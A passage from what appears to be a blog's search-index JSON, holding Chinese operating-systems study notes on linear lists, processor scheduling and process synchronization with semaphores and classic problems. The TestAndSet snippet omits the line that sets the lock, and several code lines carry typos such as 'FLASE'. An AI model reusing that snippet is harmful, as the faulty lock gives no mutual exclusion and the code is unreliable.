\u0026gt;= 0）个数据元素的有限序列，其中 n 为表长，当 n = 0 时，线性表是一个空表。\n$$ L = (a_1, a_2, ..., a_i, a_{i+1}, ..., a_n) $$ 式中，a1 是唯一一个“第一个”数据元素，又称表头元素：an是唯一的“最后一个”数据元素，又称表尾元素。除第一个元素外，每个元素有且仅有一个直接前驱。除最后一个元素外，每个元素有且仅有一个直接后继。以上就是线性表的逻辑特性，这种线性有序的逻辑结构正是线性表名字的由来。\n线性表的特点如下：\n表中元素的个数有限； 表中元素具有逻辑上的顺序性，表中元素有其先后次序； 表中元素都是数据元素，每个元素都是单个元素； 表中元素的数据类型都相同，这意味着每个元素占有相同大小的存储空间； 表中元素具有抽象性，即仅讨论元素间的逻辑关系，而不考虑元素究竟是表示什么内容。 二、线性表的基本操作 线性表的主要操作如下：\n初始化表：构造一个空的线性表； 求表长：返回线性表 L 的长度； 按值查找：在线性表中查找具有给定关键字的元素； 按位查找：获取线性表中第 i 个位置的元素的值； 插入操作：在表的第 i 个位置上插入指定元素 e； 删除操作：删除表的第 i 个位置的元素，并用 e 返回删除元素； 输出操作：按前后顺序输出线性表 L 的所有元素值； 判空操作：若 L 为空表，则返回 True，反之为 Fasle； 销毁操作：销毁线性表，并释放线性表所占用空间。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/2.1-%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","title":"2.1 线性表的定义和基本操作"},{"content":"2.2 处理机调度 思维导图 一、调度的概念 1. 调度的基本概念 在多道程序中，进程的数量往往多于处理机的个数，因此进程争用处理机的情况在所难免。处理机调度是对处理机进行分配，即从就绪队列按照一定的算法（公平、高效）选择一个进程并将处理机分配给它运行。\n2. 调度的层次 一个作业从提交直到完成往往需要经历三级调度：\n作业调度（高级调度）：其主要任务是按照一定的原则，从外存上处于后备状态的作业中挑选一个（或多个）作业，给它们分配除处理机之外的必要资源，并建立相应的进程，以使它们获得竞争处理机资源的权力。对于每个作业只调入一次、调出一次； 中级调度（内存调度）：其作用是提高内存利用率和系统吞吐量。为此应将那些暂时不能运行的进程调度至外存等待，把此时的进程称为挂起态。当它们已具有运行条件且内存又稍有空闲时，由中级调度来决定把外村上的那些已具备运行条件的就绪进程再重新调入内存，并修改其状态为就绪态，挂在就绪队列上等待； 进程调度（低级调度）：其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。进程调度是操作系统中最基本的一种调度。 3. 三级调度的关系 作业调度为进程活动做准备，进程调度使进程正常活动起来，中级调度将暂时不能运行的进程挂起，中级调度处于作业调度和进程调度之间； 作业调度次数少，中级调度次数略多，进程调度频率最高； 进程调度是最基本的，不可或缺。 二、调度的时机、切换与过程 进程调度和切换程序是操作系统内核程序。请求调度的事件发生后，才可能运行进程调度程序，调度了新的就绪进程后，才会进行进程间的切换。理论上这三种事情应当顺序发生，但在实际情况中，操作系统内核程序运行时，若某时发生了引起进程调度的因素，不一定会进行调度与切换。\n不能进行进程与切换的情况有以下几种：\n在处理中断的过程中：中断处理过程复杂，在实现上很难做到进程切换，而且中断处理是操作系统的一部分，逻辑上不属于某一进程，不应被剥夺处理机资源； 进程在操作系统内核程序临界区中：进入临界区后，需要独占式地访问共享数据，理论上必须加锁，以防止其他并行程序进入，在解锁前不应切换到其它进程运行； 其它需要完全屏蔽中断的原子操作过程中：在原子过程中，如加锁、解锁、中断线程保护、恢复等操作，此时连中断都需要屏蔽，更不应该进行进程调度和切换了。 若在上述过程发生了引起调度的条件，则不能马上进行调度和切换，应置系统的请求调度标志，直到上述过程结束后才进行相应的调度与切换。\n应该进行进程调度与切换的情况如下：\n发生引起调度条件且当前进程无法继续运行下去时，可以马上进行调度与切换。若操作系统只在这种情况下进行进程调度，则是非剥夺调度； 中断处理结束或自陷处理结束后，返回被中断进程的用户态程序执行现场前，若置上请求调度标志，即可马上进行进程调度与切换。若操作系统支持这种情况下的运行调度程序，则实现了剥夺方式的调度。 进程切换往往在调度完成后立刻发生，它要求保存原进程的现场信息，恢复被调度进程的现场信息。现场切换时，操作系统内核将原进程的现场信息推入当前进程的内核堆栈来保存它们，并更新堆栈指针。内核完成从新进程的内核栈装入新进程的现场信息、更新当前运行进程空间指针、重设 PC 寄存器等相关工作后，开始运行新的进程。\n三、进程调度方式 所谓进程调度方式，是指当某个进程正在处理机上执行时，若有某个更为重要或紧迫的进程需要处理，此时应该如何分配处理机。\n通常有以下两种进程调度方式：\n非剥夺调度方式（非抢占方式）：非剥夺调度方式是指当一个进程正在处理机上执行时，即使有某个更为重要或紧迫的进程进入就绪队列，仍然让正在执行的进程继续执行，直到该进程完成或进入阻塞状态时，才将处理机分配给更重要的进程。这种方式的优点是实现简单、系统开销小，适用于大部分批处理系统，但不适用于分时系统和绝大部分实时系统； 剥夺调度方式（抢占方式）：剥夺调度方式是指当一个进程正在处理机上执行时，若有某个优先级更高的进程需要使用处理机，则立即暂停正在执行的进程，将处理机分配给优先级更高的进程。采用剥夺式的调度，对提高系统吞吐率和相应效率都有明显的好处，但“剥夺”不是一种任意的行为，必须遵守一定的原则，主要有优先权、短进程优先和时间片原则等。 四、进程调度的基本原则 不同的调度算法具有不同的特性，在选择调度算法时必须考虑算法的特性。\n算法的评价准则主要有以下几种：\nCPU 利用率：CPU 是计算机中最重要和最昂贵的资源之一，好的调度算法应当尽可能是 CPU 在工作状态； 系统吞吐量：即单位时间内 CPU 完成作业的数量； 周转时间：指从作业提交到作业完成所经历的时间； 作业周转时间 = 作业完成时间 - 作业提交时间； 平均周转时间 =（作业 1 周转时间 + 作业 2 周转时间 + \u0026hellip; + 作业 n 周转时间）/ n； 带权周转时间 = 作业周转时间 / 作业实际运行时间； 平均带权周转时间 = （作业 1 带权周转时间 + \u0026hellip; + 作业 n 带权周转时间）/ n。 等待时间：指进程处于等待处理机状态的时间之和，等待使劲按越长用户满意度越低。衡量一个调度算法的优劣通常只需要简单地考察等待时间； 响应时间：指从用户提交请求到系统首次产生相应所用的时间。 五、典型的调度算法 1. 先来先服务（FCFS）算法 FCFS 调度算法是一种最简单的调度算法，它既可以用于作业调度，又可以用于进程调度。\n在作业调度时，算法每次从后备作业队列中选择最先进入该队列的一个或几个任务，将它们调入内存，分配必要的资源，创建进程并放入就绪队列中。\n在进程调度时，FCFS 每次从就绪队列中选择最先进入该队列的进程，将处理机分配给它，直到进程完成任务或因为某种原因阻塞后才释放处理机。\nFCFS 属于不可剥夺算法。从表面上看，它对所有作业都是公平的，但若一个长作业优先到达队列，就会使后面的许多短作业等待很长时间。因此它不能用于分时系统和实时系统的主要调度策略。但它常被结合在其它调度策略中使用。\nFCFS 的特点是算法简单，但是效率较低；对长作业比较有利，对短作业不利；有利于 CPU 繁忙型作业，不利于 I/O 繁忙型作业。\n2. 短作业优先（SJF）算法 短作业（进程）优先调度算法是指对短作业（进程）优先调度的算法。\n短作业优先（SJF）调度算法从后备队列中选择一个或多个预估运行时间最短的作业，将它们调入内存运行；从就绪队列中选择一个预估时间最短的进程，将处理机资源分配给它，直到完成或发生某事件阻塞时才释放处理机。\nSJF 算法也存在不容忽视的缺点：\n该算法对长作业不利，长作业在队列中可能总是得不到资源； 未考虑作业的紧迫程度； 由于作业时间是根据用户提供信息设置的，该算法不一定能做到真正的短作业优先调度。 不过 SJF 算法的平均等待时间、平均周转时间最少。\n3. 优先级调度算法 优先级调度算法又称为优先权调度算法，它既可以用于作业调度也可以用于进程调度。算法中的优先级用于描述作业运行的紧迫程序。\n根据新的更高优先级进程是否能够抢占正在执行的进程，可将该算法分为：\n非剥夺式优先级调度算法：必须等到运行中的进程运行完毕或者阻塞时才能让更高优先级的进程使用处理机资源； 剥夺式优先级调度算法：正在运行的进程立即暂停，并将处理机资源让给更高优先级的进程。 根据进程创建后优先是否可以改变可以将算法分为：\n静态优先级：优先级是在创建进程是确定，在运行期间不可以更改； 动态优先级：优先级在创建进程是设定，可以根据情况动态的调整优先级。 进程优先级的设置一般参考以下准则：\n系统进程 \u0026gt; 用户进程； 交互进程 \u0026gt; 非交互进程（前台进程 \u0026gt; 后台进程）； I/O 型进程 \u0026gt; 计算型进程。 4. 高响应比优先调度算法 $$ 响应比R_p = {等待时间 + 要求服务时间\\over 要求服务时间} $$ 根据公式可知：\n作业等待时间相同，要求服务时间越短，响应比越高，越有利于短作业； 要求服务时间相同时，作业的响应时间由其等待时间决定，等待时间越长，其响应比越高，因而它实现的时先来先服务； 对于长作业，作业的响应比可以随等待时间的增加而提高，等待时间足够长时，其响应比可得到提升，从而可以获得处理机，因此兼顾了长作业。 5. 时间片轮转调度算法 时间片轮转调度算法主要适用于分时系统。\n在这种算法中，系统将所有就绪进程按到达时间的先后次序排成一个队列，进程调度程序总是选择就绪队列中的第一个执行，但仅能运行一个时间片。若一个时间片内进程完成作业，则退出操作系统；若未完成，则也必须释放处理机资源，然后进入就绪队列的末尾重新排队，等待再次运行。\n在时间片轮转调度算法中，时间片的大小对系统性能的影响很大。时间片过长则可能会变成 FCFS 调度算法；若时间片过短系统又可能频繁切换，使处理机的开销增大。\n时间片的长短通常由以下因素确定：系统的响应时间、就绪队列中的进程数目和系统的处理能力。\n6. 多级反馈队列调度算法（融合了前几种算法的优点） 多继反馈队列算法是时间片轮转调度算法和优先级调度算法的综合与发展，通过动态调整进程优先级和时间片大小，多级反馈队列调度算法可以兼顾多方面的系统目标。\n多级反馈调度算法的思想如下：\n设置多个就绪队列，并为各个队列赋予不同的优先级，第一级队列的优先级最高，第二级次之，其余队列优先级逐步降低； 赋予各个队列中进程执行时间片的大小各不相同。在优先级越高的队列中，每个进程的运行时间片越小； 当一个新进程进入内存后，首先放入第一级队列末尾，按 FCFS 原则等待调度。当轮到该进程执行时，若能在该时间片完成，则可准备撤离系统；若不能完成，则将该进程转入第二级队列末尾，按照相同的规律一直进行下去。当降到第 n 级队列中便采用时间片轮转的方式进行； 仅当第一级队列为空时，调度程序才调度第二级队列的进程，仅当第 1 ~ （i - 1）级队列均为空时，才调度第 i 级队列的进程。若处理机正在处理第 i 级的进程，此时有新进程进入更高优先级的队列，则此时进程将抢占正在运行进程的处理机，即由调度程序把正在运行的进程放回第 i 级队列的末尾，把处理机分配给新到的更改优先级进程使用。 多级反馈队列的优势：\n终端型作业用户：短作业优先； 短批量处理作业用户：周转时间短； 长批量处理作业用户：经过前面几个队列作业部分执行，不会长期得不到处理。 参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/2.2-%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/","title":"2.2 处理机调度"},{"content":"2.3 进程同步 思维导图 一、进程同步的基本概念 在多道程序环境下，进程是并发执行的，不同进程之间存在着不同的制约关系。为了协调进程之间的相互制约的关系，引入进程同步的概念。\n1. 临界资源 多个进程可以共享的各种资源，但是有的资源只能同时为一个进程服务，这样的资源就被称为临界资源。\n对于临界资源的访问必须互斥地进行。在每个进程中，访问临界资源的代码称为临界区。为了确保临界资源的正确使用，可以将临界资源的访问分为四个过程：\n进入区：为了进入临界区使用临界资源，在进入区要检查能否进入临界区。若能进入临界区，则应设置正在访问临界区的标志，以阻止其它进程同时进入临界区； 临界区：进程中访问临界资源的那段代码，又称临界段； 退出区：将正在访问临界区的标志清除； 剩余区：代码中的其余部分。 2. 同步 同步亦称直接制约关系。是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递消息所产生的制约关系。进程间的直接制约关系源于它们之间的相互合作。\n例如输入进程 A 通过单缓冲向进程 B 提供数据。当该缓冲区为空时，进程 B 不能获得所需要的数据而阻塞，当进程 A 将数据输入缓冲区时，进程 B 被唤醒；当缓冲区为满时，进程 A 被阻塞，当 B 从缓冲区取走数据后，进程 A 被唤醒。\n3. 互斥 互斥也称间接制约关系。当一个进程进入临界资源区使用临界资源时，另一个进程必须等待，当占用临界资源的进程退出临界区后，另一个进程才允许去访问此资源。\n为禁止两个进程同时进入临界区，同步机制应遵循以下准则：\n空闲让进：临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区； 忙则等待：当已有进程进入临界区时，其它试图进入临界区的进程必须等待； 有限等待：对请求访问的资源，应保证能在有限时间内进入临界区； 让权等待：当进程不能进入临界区时，应立即释放处理器，防止进程忙等待。 二、实现临界区互斥的基本方法 1. 软件实现方法 在进入区设置一些标志来标明是否有进程在临界区中，若已有进程在临界区，则在进入区通过循环检查进行等待，进程离开临界区后则在退出区修改标志。\n算法一：单标志法 该算法设置一个公用整型变量 turn，用于指示被允许进入临界区的进程编号。若 turn = 0，则允许 P0 进程进入临界区。那么谁来改变 turn 的值？如果是公共区域控制turn这个变量，那么 P0 不想进的时候，即使是 turn = 0 ,对于进程 P0 也是没有价值的。公共区域无法预测谁想要，所以这个控制权还是分权给进程来管理比较好一些。\nPi想进入时检测 turn 值是否是自己的 turn，如果不是，就需要等待，该算法可确保每次只允许一个进程进入临界区。两个进程必须交替进入临界区，一个进程进入临界区，使用完成后将 turn的值设置为另外一个进程。若某个进程不再进入临界区，则另一个进程也将无法进入临界区（违背“空闲让进”）。若 P0 顺利进入临界区并从临界区离开，则此时临界区是空闲的，但 P1 并没有进入临界区的打算，turn = 1一直成立，P0 就无法再次进入临界区（一直被 while 死循环困住）。\n算法描述：\n1 2 3 4 5 P0 进程：\tP1 进程： while (turn != 0);\twhile (turn != 1); // entry section critical section;\tcritical section; turn = 1; turn = 0; // exit section remainder section;\tremainder section; 算法二：双标志法先检查 该算法的基本思想是在每个进程访问临界区之前，先检查临界区资源是否正在访问。若正在被访问，则该进程需等待；否则进程进入自己的临界区。为此设置一个数据 flag[i]， 如第 i 个元素为 FALSE，则表示 Pi 进程未进入临界区；值为 TRUE，表示 Pi 进程进入临界区。\n优点：不要交替进入，可连续使用；\n缺点：按 ①②③④ 执行时，Pi 和 Pj 会同时进入临界区（违背“忙则等待”）。这里问题出在检查和修改操作不能一次进行。\n算法描述：\n1 2 3 4 5 6 Pi 进程：\tPj 进程： while (flag[j]);\t① while (flag[i]); ② // entry section flag[i] = TRUE;\t③ flag[j] = TRUE; ④ // entry section critical section; critical section; flag[i] = FALSE; flag[j] = FALSE; // exit section remainder section;\tremainder section; 算法三：双标志法后检查 该算法先将自己的标志设置为 TRUE，再检测对方的状态标志，若对方标志为 TRUE 则进入等待；否则进入临界区。\n缺点：两个进程同时想进入等待区时，它们分别将自己的标志 flag 设置为 TRUE，然后再进行检测时就会发生“饥饿”现象，双方都无法进入临界区。\n算法描述：\n1 2 3 4 5 6 Pi 进程：\tPj 进程： flag[i] = TRUE;\tflag[j] = TRUE; // entry section while (flag[j]);\twhile (flag[i]); // entry section critical section;\tcritical section; flag[i] =FLASE;\tflag [j] = FLASE; // exit section remainder section;\tremainder section; 算法四：Peterson’s Algorithm 为了防止两个进程为进入临界区而无限期等待，又设置了变量 turn，每个进程在先设置自己的标志后再设置 turn 标志。这是，再同时检测另一个进程状态标志和不允许进入标志，以便保证两个进程同时要求进入临界区时，只允许一个进程进入临界区。\n优点：利用 flag 解决临界资源互斥访问，利用 turn 解决“饥饿”现象；\n缺点：未遵循“让权等待”。\n算法描述：\n1 2 3 4 5 6 Pi 进程：\tPj 进程： flag[i] = TURE; turn = j;\tflag[j] = TRUE; turn = i; // entry section while (flag[j] \u0026amp;\u0026amp; turn == j); while (flag[i] \u0026amp;\u0026amp; turn == i); // entry section critical section;\tcritical section; flag[i]=FLASE; flag[j] = FLASE; remainder section;\tremainder section; 2. 硬件实现方法 计算机提供了特殊的硬件指令，允许对一个字中的内容进行检测和修正，或对两个字中的内容进行交换等。通过硬件支持实现临界段问题的方法称为低级方法或元方法。\n（1）中断屏蔽方法 当一个进程正在使用处理机执行它的临界区代码时，防止其他进程进入临界区进行访问的最简方法就是禁止一切中断发生，或称为屏蔽中断、关闭中断。其原理为 CPU 在发生中断时切换进程，因此关闭中断就能让临界区代码顺利执行完成。其典型模式为：\n1 2 3 4 5 ... 关中断； 临界区代码； 开中断； ... 此种方法限制了处理机交替执行程序的能力，因此执行效率会明显降低。对内核而言，在它执行更新变量或列表的几条指令期间，关中断是很方便的。但是将关中断的权力移交给用户是很不明智的，若进程关中断后不再打开，很可能会让系统终止。\n（2）硬件指令方法 TestAndSet 指令：该指令为原子操作，执行该代码时不允许被中断。其功能为读出指定标志后把该标志设置为真。\n指令的功能描述如下：\n1 2 3 4 5 boolean TestAndSet (boolean *lock) { boolean old; old = *lock; return old; } 可以为每个临界资源设置一个共享布尔型变量 lock，表示资源的两种状态：true表示正被占用，初始值为false。在进程访问临界资源之前，利用 TestAndSet检查和修改标志 lock；若有进程在临界区，则反复检查，直到进程退出。利用该指令实现进程互斥的算法描述如下：\n1 2 3 4 while TestAndSet(\u0026amp;lock); critical section; lock = false; remainder section; Swap 指令：该指令的功能是交换两个字节的内容。\n其功能描述如下：\n1 2 3 4 5 6 Swap(boolean *a, boolean *b) { boolean temp; Temp = *a; *a = *b; *b = temp; } 应为每个临界资源设置一个共享布尔型变量 lock，初值为 false；在每个进程中再设置一个局部布尔型变量 key，用于与 lock交换信息。在进入临界区前，先利用 Swap指令交换 lock 与 key 的内容，再检查 key 的状态；有进程在临界区时，重复交换和检查过程，直到进程退出。利用 Swap 指令实现进程互斥的算法描述如下：\n1 2 3 4 5 6 key = true; while(key != false) Swap(\u0026amp;lock, \u0026amp;key); critical section; lock = false; remainder section; 优点：适用于任意数目的进程，并且不管是单处理机还是多处理机都适用；简单、容易验证其正确性。可以支持进程内有多个临界区，只需要为每个临界区设立一个布尔型变量。\n缺点：进程等待进入临界区时要耗费处理机时间，不能实现让权等待。从等待队列中随机选择一个进入临界区，有的进程可能一直选不上，从而导致“饥饿”现象。\n三、信号量 信号量机制是一种功能较强的机制，可用来解决互斥与同步问题，它只能被两个标准的原语wait(S)和signal(S)访问，也可记作“P操作”和“V操作”。\n原语是指完成某种功能且不被分割、不被中断执行的操作序列。原语之所以不能被中断执行，是因为原语对变量的操作若被打断，可能会去运行另一个对同一变量的操作过程，从而出现临界问题。\n1. 整型信号量 整型信号量被定义为一个用于表示资源数目的整型量 S，wait 和 signal 操作可描述为：\n1 2 3 4 5 6 7 8 wait(S) { while(S \u0026lt;= 0); S = S - 1; } signal(S) { S = S + 1; } wait 操作中，只要信号量 S \u0026lt;= 0，就会不断测试。因此该机制未遵循“让权等待”，而是使进程处于“忙等”的状态。\n2. 记录型信号量 记录型信号量是不存在“忙等”现象的进程同步机制。除需要一个用于代表资源数目的整型变量 value 外，再增加一个进程链表 L，用于链接所有等待资源的进程。记录型信号量得名于采用了记录型的数据结构。记录型信号量可描述为：\n1 2 3 4 typedef struct { int value; struct process *L; } semaphore; 相应的 wait 和 signal 的操作如下：\n1 2 3 4 5 6 7 void wait(semaphore S) { S.value--; if (S.value \u0026lt; 0) { add this process to S.L; blcok(S.L); } } wait操作，S.value--表示进程请求一个该类资源，当S.value \u0026lt; 0时，表示该类资源已经分配完毕，因此进程应调用block原语，进行自我阻塞，放弃处理机，并插入该类资源的等待队列S.L，可见该机制遵循了“让权等待”。\n1 2 3 4 5 6 7 void signal(semaphore S) { S.value++; if (S.value \u0026lt;= 0) { remove a process P from S.L; wakeup(P); } } signal操作，表示进程释放一个资源，使进程中可分配的该类资源数加一，故有S.value++。若加一后S.value \u0026lt;= 0，则表示S.L中仍有等待该资源的进程被阻塞，故还应该调用wakeup原语，将S.L中的第一个等待进程唤醒。\n3. 利用信号量实现同步 信号量机制能用于解决进程间的各种同步问题。设 S 为实现进程 P1、P2 同步的公共信号量，初始值为 0。进程 P2 中的语句 y 要使用进程 P1 中语句 x 的运行结果，所以只有当语句 x 执行完成之后语句 y 才可以执行。\n其实现同步的算法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 semaphore S = 0; // 初始化信号量 P1() { ... x; // 语句 x V(S); // 告诉进程 P2，语句 x 已经完成 ... } P2() { ... P(S); // 检查语句 x 是否完成 y; // 语句 y ... } 若 P2 先执行到P(S)时，S = 0，执行 P 操作就会阻塞进程，并放入阻塞队列；当 P1 中 x 执行完后，执行 V 操作，把 P2 从阻塞队列放回就绪队列，当 P2 得到处理机时，就可以继续运行。\n4. 利用信号量实现进程互斥 信号量机制也能很方便的解决进程互斥的问题。设 S 为实现进程 P1、P2 互斥的信号量，由于每次只允许一个进程进而临界区，所以 S 的初值为 1（即可用资源数为 1）。只需要把临界区置于 P(S) 和 V(S) 之间，即可实现两个进程对临界资源的互斥访问。其算法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 semaphore S = 1; // 初始化信号量 P1() { ... P(S); // 准备开始访问临界资源，加锁 进程 P1 的临界区; V(S); // 访问结束，解锁 ... } P2() { ... P(S); // 准备开始访问临界资源，加锁 进程 P2 的临界区; V(S); // 访问结束，解锁 ... } 当没有进程在临界区时，任意一个进程要进入临界区，都要执行 P 操作，把 S 的值减为 0，然后进入临界区；当有进程存在于临界区时，S 的值为 0，再有进程要进入临界区，执行 P 操作时将会被阻塞，直至在临界区中的进程退出，这样便实现了临界区的互斥。\n在同步问题中，若某个行为要用到某种资源，则这个行为前面执行 P 操作；若某个行为会提供某种资源，则在该行为后面执行 V 操作。在互斥问题中，P、V 操作要紧夹使用互斥资源的行为，不能有冗余代码。\n5. 利用信号量实现前驱关系 信号量也可用来描述程序之间或语句之间的前驱关系。\n在上面的前驱图中，S1、S2\u0026hellip;S6是最简单的程序段（只有一条语句）。为了使程序段能正确执行，需要设置若干初始值为 \u0026ldquo;0\u0026rdquo; 的信号量。\n实现算法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 semaphore a1 = a2 = b1 = b2 = c1 = c2 = c3 = 0; // 初始化信号量 S1() { ...; V(a1); V(a2); // S1 已经完成 } S2() { P(a1); // 检查 S1 是否完成 ...; V(b1); V(b2); // S2 已经完成 } S3() { P(a2); // 检查 S1 是否已经完成 ...; V(c1); // S3 已经完成 } S4() { P(b1); // 检查 S2 是否已经完成 ...; V(c2); // S4 已经完成 } S5() { P(b2); // 检查 S2 是否已经完成 ...; V(c3); // S5 已经完成 } S6() { P(c1); P(c2); P(c3); // 检查S3、S4、S5 是否已经完成 } 6. 分析进程同步和互斥问题的方法步骤 关系分析：找出问题中的进程数，并分析它们之间的同步和互斥的关系； 整理思路：找出解决问题的关键点，根据进程的操作流程确定 P、V 的大致顺序； 设置信号量：根据需要的信号量，确定初值。 四、管程 1. 管程的定义 系统中的各种硬件资源和软件资源均可以用数据结构进行抽象的描述其资源特性。管程是由一组数据及定义在这对数据之上的操作组成的软件模块，这组操作能初始化并改变管程中的数据和同步进程。\n2. 管程的组成 局部于管程的共享变量； 对数据结构进行操作的一组过程； 对局部于管程的数据进行初始化的语句。 3. 管程的基本特性 局部于管程的数据只能被局部于管程内的过程访问； 一个进程只有通过调用管程内的过程才能进入管程访问共享数据； 每次仅允许一个进程在管程内执行某个内部过程。 4. 管程的属性 共享性：管程可被系统范围内的进程互斥访问，属于共享资源； 安全性：管程的局部变量只能由管程的过程访问，不允许进程或其它管程直接访问，管程也不能访问非局部于它的变量； 互斥性：多个进程对管程的访问是互斥的。任一时刻，管程中只能有一个活跃进程； 封装性：管程内的数据结构是私有的，只能在管程内使用，管程内的过程也只能使用管程内的数据结构。进程通过调用管程的过程使用临界资源。 五、经典同步问题 1. 生产者-消费者问题 问题描述：一组生产者进程和一组消费者进程共享一个初始为空、大小为 n 的缓冲区。只有缓冲区没满时生产者才能把消息放入缓冲区，否则必须等待；只有缓冲区不为空时，消费者才能从中取出消息，否则必须等待。由于缓冲区是临界资源，它只允许一个生产者放入消息，只允许一个消费者从中取出消息。\n问题分析：\n关系分析：生产者和消费者对缓冲区访问是既是互斥关系又是同步关系； 整理思路：需要解决互斥和同步 PV 操作的位置； 信号量设置：信号量 mutex 作为互斥信号量，用于控制互斥访问缓冲池，互斥信号量为 1；信号量 full 用于记录当前缓冲池中的“满”缓冲区数，初值为 0；信号量 empty 用于记录当前缓冲池中“空”缓冲区数，初值为 n。 算法描述：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 semaphore mutex = 1, empty = n, full = 0; // 初始化信号量 producer() { while(1) { produce an item in nextp; // 生产数据 P(empty); // （要用什么 P 什么）获取空缓冲单元 P(mutex); // （互斥夹紧）进入临界区 add nextp to buffer; // （行为）将数据放入缓冲区 V(mutex); // （互斥夹紧）离开临界区 V(full); // （提供什么 V 什么）满缓冲区加一 } } consumer() { while(1) { P(full); // 获取满缓冲区单元 P(mutex); // 进入临界区 remove an item from buffer; // 从缓冲区取出数据 V(mutex); // 离开临界区，释放互斥信号量 V(empty); // 空缓冲区数加一 consume the item; // 消费数据 } } 下面再来看一个较为复杂的生产者-消费者问题：\n问题描述：桌子上有一个盘子，每次只能向其中放入一个水果。爸爸专门向盘子中放苹果，妈妈专门向进程中放橘子，儿子专等吃盘子中的橘子，女儿专等吃盘子中的苹果。只有盘子为空时，爸爸或妈妈才可以向盘子中放水果，仅当盘子中有对应的水果时，儿子女儿才能从盘子中取出水果。\n问题分析：\n关系分析：爸爸和妈妈是互斥关系，爸爸和女儿、妈妈和儿子是同步关系，儿子和女儿没有关系。女儿或儿子拿走水果后才能释放盘子； 整理思路：四个进程可以抽象为两个生产者和两个消费者被连接到大小为 1 的缓冲区上； 信号量设置：信号量 plate 为互斥信号量，初值为 1；信号量 apple 表示盘子中是否有水果，初值为 0；信号量 orange 表示盘子中是否有橘子，初值为 0。 算法描述：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 semaphore plate = 1, apple = 0, orange = 0; // 初始化信号量 dad() { while(1) { prepare an apple; P(plate); // 互斥向盘中取、放水果 put the apple on the plate; // 向盘中放水果 V(apple); // 允许取苹果 } } mom() { while(1) { prepare an orange; P(plate); // 互斥向盘中取、放水果 put the orange on the plate; // 向盘中放水果 V(orange); // 允许取橘子 } } son() { while(1) { P(orange); // 互斥向盘中取水果 take an orange from plate; // 取水果 V(plate); // 允许向盘子中取、放水果 eat the orange; } } daughter() { while(1) { P(apple); // 互斥向盘中取水果 take an apple from plate; // 取水果 V(plate); // 允许向盘子中取、放水果 eat the apple; } } 2. 读者-写者问题 问题描述：有读者和写者两组并发进程，共享一个文件，当两个或以上的读进程同时访问数据时不会产生副作用。但若某个写进程和其他进程（读进程或写进程）同时访问共享数据时则可能导致数据不一致的错误。\n因此要求：\n允许多个读者可以同时对文件执行读操作； 只允许一个写者往文件中写信息； 任意写者在完成操作前都不允许其他读者或写者工作； 写者操作前应该让已有的读者和写者退出。 问题分析：\n关系分析：读者和写者是互斥的，写者和写者也是互斥的，读者和读者之间不存在互斥现象。 整理思路：写者和任何进程互斥，用 PV 操作即可。写者必须在实现与写者互斥的同时，实现与其他读者的同步。这里需要使用一个计数器，用来判断当前是否有读者读文件。当有读者时，写者是无法写文件的，读者会一直占用文件，当没有读者时，写者才可以写文件。同时不同读者对计数器的访问也是互斥的。 信号量设置：设置信号量 count 为计数器，用于记录当前读者的数量，初值为 0；设置 mutex 为互斥信号量，用于保护更新 count 变量时的互斥；设置互斥信号量 rw，用于保证读者和写者的互斥访问。 算法描述：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 int count = 0; // 用于记录当前的读者数量 semaphore mutex = 1, rw = 1; // 用于保护更新 count 变量时的互斥和读者写者互斥地访问 writer() { while(1) { P(rw); // 互斥访问共享文件 writing; // 写入 V(rw); // 释放共享文件 } } reader() { while(1) { P(mutex); // 互斥访问 count 变量 if (count == 0) // 当第一个读进程读共享文件时 P(rw); // 阻止写进程写 count++; // 读者计数器加一 V(mutex); // 释放互斥变量 count reading; // 读取 P(mutex); // 互斥访问 count 变量 count--; // 读者计数器减一 if(count == 0) // 当最后一个读进程读完共享文件 V(rw); // 允许写进程 V(mutex); // 释放互斥变量 count } } 在上面地算法中，读进程是优先的。当存在读进程时，写操作将被延迟，且只要有一个读进程活跃，随后而来的读进程都将被允许文件。这样的方式会导致写进程可能长时间等待，且存在写进程“饿死”情况。\n若希望写进程优先，即有读进程正在读共享文件时，有写进程请求访问，这时应禁止后续读进程的请求，等到已在共享文件的读进程执行完成，立即让写进程执行，只有在无写进程执行的情况下允许读进程再次运行。为此需要增加一个信号量并在上面程序的write() 和 reader()函数中各增加一个 PV 操作，就可以得到写进程优先的解决程序。\n算法实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 int count = 0; // 计数器初始化 semaphore mutex = 1, rw = 1, w = 1; // 信号量初始化 writer() { while(1) { P(w); // 在无写进程请求时进入 P(rw); // 互斥访问共享文化 writing; // 写入 V(rw); // 释放共享文件 V(w); // 恢复共享文件的访问 } } reader() { while(1) { P(w); // 在无写进程请求时进入 P(mutex); // 互斥访问 count 变量 if (count == 0) // 在第一个读进程共享文件时 P(rw); // 阻止写进程写 count++; // 读者计数器加一 V(mutex); // 释放互斥变量 count V(w); // 恢复对共享文件的访问 reading; // 读取 P(mutex); // 互斥访问 count 变量 count--; // 读者计数器减一 if (count == 0) // 当最后一个读进程读完共享文件 V(rw); // 运行写进程写 V(mutex); // 释放互斥变量 count } } 读者-写者问题有一个关键的特征：有一个互斥访问的 count 计数器。我们解决其他互斥问题时也可以尝试以下 count 计数器互斥。\n3. 哲学家进餐问题 